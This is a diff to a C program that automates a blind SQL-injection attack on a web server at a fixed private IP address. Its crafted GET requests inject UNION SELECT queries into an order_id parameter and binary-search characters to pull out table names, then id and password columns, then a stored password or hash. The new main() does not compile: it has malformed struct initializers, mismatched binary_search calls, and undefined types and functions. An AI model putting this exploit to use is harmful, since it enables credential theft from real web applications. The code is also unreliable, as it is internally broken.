@@ -204,16 +204,74 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-bool send_check_success(const char * discovered_name, int i, const char *mid, int sockfd, const char *req) {
-    char mal_req[2048];
-    sprintf(mal_req, req,
-        discovered_name, i + 1, mid
-    );
+typedef bool (*check_func_t)(void *ctx);
 
-    _send(sockfd, mal_req, strlen(mal_req));
+typedef struct {
+    int sockfd;
+    char *discovered;
+    int index;
+    const char *guess;
+} GeneralCtx;
 
-    return recv_empty(sockfd);
+typedef struct {
+    GeneralCtx gen_ctx;
+    const char *col_to_find;
+    const char *table_name;
+} ColumnCtx;
+
+typedef struct {
+    GeneralCtx gen_ctx;
+    const char *table_name;
+    const char *id_col;
+    const char *pwd_col;
+} PwdCtx;
+
+bool check_table(void *ctx) {
+    GeneralCtx *table_ctx = (GeneralCtx *)ctx;
+
+    char mal_req[4096];
+
+    const char *fmt = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+        " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    sprintf(mal_req, fmt, table_ctx->discovered, table_ctx->index + 1, table_ctx->guess);
+    _send(table_ctx->sockfd, mal_req, strlen(mal_req));
+    return recv_empty(table_ctx->sockfd);
 }
+
+bool check_column(void *ctx) {
+    ColumnCtx *c_ctx = (ColumnCtx*)ctx;
+    char mal_req[4096];
+
+    const char *fmt = "GET /index.php?order_id=SELECT%%20column_name%%20FROM%%20information_schema.COLUMNS%%20WHERE%%20table_name%%3d%%27%s%%27%%20AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+        " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->col_to_find, c_ctx->gen_ctx.discovered, c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
+    _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
+    return recv_empty(c_ctx->gen_ctx.sockfd);
+}
+
+bool check_password(void *ctx) {
+    PwdCtx *d_ctx = (PwdCtx*)ctx;
+    char mal_req[4096];
+
+    const char *fmt = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20%s%%20FROM%%20%s%%20WHERE%%20%s%%3d322695107%%20AND%%20%s%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+        " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    sprintf(mal_req, fmt, d_ctx->pwd_col, d_ctx->table_name, d_ctx->id_col, d_ctx->pwd_col, d_ctx->gen_ctx.discovered, d_ctx->pwd_col, d_ctx->gen_ctx.index + 1, d_ctx->gen_ctx.guess);
+    _send(d_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
+    return recv_empty(d_ctx->gen_ctx.sockfd);
+}
+
 
 const char *url_map[96] = {
     "%20", // 0x20 Space
@@ -269,7 +327,8 @@ const char *url_map[96] = {
     "%7F"  // 0x7F DEL
 };
 
-void binary_search(char discovered_name[31], int sockfd, const char *req) {
+void binary_search(check_func_t check_fn, void *ctx) {
+    GeneralCtx *gen_ctx = (GeneralCtx *)ctx;
 #ifdef __MY_DEBUG__
     int count = 0;
 #endif
@@ -286,20 +345,22 @@ void binary_search(char discovered_name[31], int sockfd, const char *req) {
         #ifdef __MY_DEBUG__
             count++;
         #endif
-            if (send_check_success(discovered_name, i, url_map[mid], sockfd, req)) {
+            gen_ctx->index = i;
+            gen_ctx->guess = url_map[mid];
+            if (check_fn(ctx)) {
                 high=mid;
             }
             else {
                 low=mid + 1;
             }
         #ifdef __MY_DEBUG__
-            printf("\t%s,%c,%c\n", discovered_name, low, high);
+            printf("\t%s,%c,%c\n", gen_ctx->discovered, low, high);
         #endif
         }
         if (low>=0x5f) {
             break;
         }
-        strcat(discovered_name, url_map[low]);
+        strcat(gen_ctx->discovered, url_map[low]);
     }
 #ifdef __MY_DEBUG__
     printf("number of queries is: %d\n",count);
@@ -307,7 +368,7 @@ void binary_search(char discovered_name[31], int sockfd, const char *req) {
 }
 
 int32_t main() {
-    int32_t sockfd = create_socket();
+    /*int32_t sockfd = create_socket();
 
     _connect(sockfd, WEB_ADDR, 80);
 
@@ -380,6 +441,46 @@ int32_t main() {
 #ifdef __MY_DEBUG__
     puts(table_name);
 #endif
+
+    close(sockfd);*/
+
+
+    int32_t sockfd = create_socket();
+    _connect(sockfd, WEB_ADDR, 80);
+    char table_name[31] = {0};
+    GeneralCtx table_ctx = {
+        .sockfd = sockfd,
+        .discovered = table_name,
+        int index;
+        char *guess;
+    };
+
+    binary_search(table_name, check_table, );
+
+    #ifdef __MY_DEBUG__
+        printf("Found Table: %s\n", table_name);
+    #endif
+
+    // 2. Find ID Column
+    char id_name[33] = {0};
+    ColumnCtx id_ctx = { .table_name = table_name, .col_hint = "id" };
+    binary_search(id_name, sockfd, &id_ctx, check_column);
+
+    // 3. Find Password Column
+    char pwd_name[33] = {0};
+    ColumnCtx pwd_ctx = { .table_name = table_name, .col_hint = "pwd" };
+    binary_search(pwd_name, sockfd, &pwd_ctx, check_column);
+
+    // 4. Find Actual Password Data
+    char final_password[33] = {0};
+    DataCtx data_ctx = {
+        .table_name = table_name,
+        .id_col = id_name,
+        .pwd_col = pwd_name
+    };
+    binary_search(final_password, sockfd, &data_ctx, check_content);
+
+    printf("Found Password/Hash: %s\n", final_password);
 
     close(sockfd);
 }
